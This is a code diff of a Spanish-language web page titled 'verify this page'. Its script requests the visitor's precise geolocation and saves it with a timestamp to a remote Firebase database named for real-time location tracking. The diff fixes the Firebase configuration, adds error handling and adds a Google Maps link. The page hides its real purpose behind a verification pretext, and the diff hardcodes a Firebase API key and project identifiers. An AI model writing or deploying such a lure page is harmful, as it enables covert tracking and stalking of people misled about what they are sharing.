@@ -9,21 +9,23 @@
 </head>
 <body>
     <h2>Verifica esta página</h2>
-    <p>Esperando ubicación...</p>
+    <p id="status">Esperando ubicación...</p>
 
     <script>
-        // Configuración de Firebase (Reemplaza con tus credenciales)
+        // 🔹 Configuración de Firebase (Asegúrate de que los datos son correctos)
         const firebaseConfig = {
             apiKey: "AIzaSyBbjHMxaekPinCF54GDfZVhl0u06HKMwZg",
-            uthDomain: "ubicacionentiemporeal-5ef91.firebaseapp.com",
+            authDomain: "ubicacionentiemporeal-5ef91.firebaseapp.com",
+            databaseURL: "https://ubicacionentiemporeal-5ef91-default-rtdb.firebaseio.com",
             projectId: "ubicacionentiemporeal-5ef91",
-            storageBucket: "ubicacionentiemporeal-5ef91.firebasestorage.app",
+            storageBucket: "ubicacionentiemporeal.appspot.com",
             messagingSenderId: "192513444557",
             appId: "1:192513444557:web:01cae9b1e8c24ca5a23784",
             measurementId: "G-RK2KEYN38N"
         };
 
-        firebase.initializeApp(firebaseConfig);
+        // 🔹 Inicializar Firebase
+        const app = firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
         function obtenerUbicacion() {
@@ -32,25 +34,50 @@
                     (pos) => {
                         let lat = pos.coords.latitude;
                         let lon = pos.coords.longitude;
-                        let id_usuario = Math.random().toString(36).substring(7); // Genera un ID aleatorio
-                        
-                        // Guardar en Firebase
+                        let id_usuario = Math.random().toString(36).substring(7); // 🔹 Genera un ID aleatorio
+
+                        // 🔹 Guardar en Firebase
                         db.ref("ubicaciones/" + id_usuario).set({
                             latitud: lat,
                             longitud: lon,
                             timestamp: new Date().toISOString()
+                        }).then(() => {
+                            document.getElementById("status").innerText = "Ubicación enviada con éxito.";
+                        }).catch((error) => {
+                            document.getElementById("status").innerText = "Error al enviar la ubicación.";
+                            console.error("Error en Firebase:", error);
                         });
 
-                        document.querySelector("p").innerText = "Ubicación enviada.";
+                        // 🔹 Mostrar link en Google Maps
+                        let link = `https://www.google.com/maps?q=${lat},${lon}`;
+                        let a = document.createElement("a");
+                        a.href = link;
+                        a.innerText = "Ver ubicación en Google Maps";
+                        a.target = "_blank";
+                        document.body.appendChild(a);
                     },
                     (error) => {
-                        document.querySelector("p").innerText = "No se pudo obtener la ubicación.";
-                        console.error(error);
+                        let mensaje = "";
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                mensaje = "Error: Permiso de ubicación denegado.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                mensaje = "Error: Ubicación no disponible.";
+                                break;
+                            case error.TIMEOUT:
+                                mensaje = "Error: Tiempo de espera agotado.";
+                                break;
+                            default:
+                                mensaje = "Error desconocido.";
+                        }
+                        document.getElementById("status").innerText = mensaje;
+                        console.error("Error de geolocalización:", error);
                     },
-                    { enableHighAccuracy: true }
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
-                document.querySelector("p").innerText = "Geolocalización no soportada.";
+                document.getElementById("status").innerText = "Geolocalización no soportada en este navegador.";
             }
         }
 
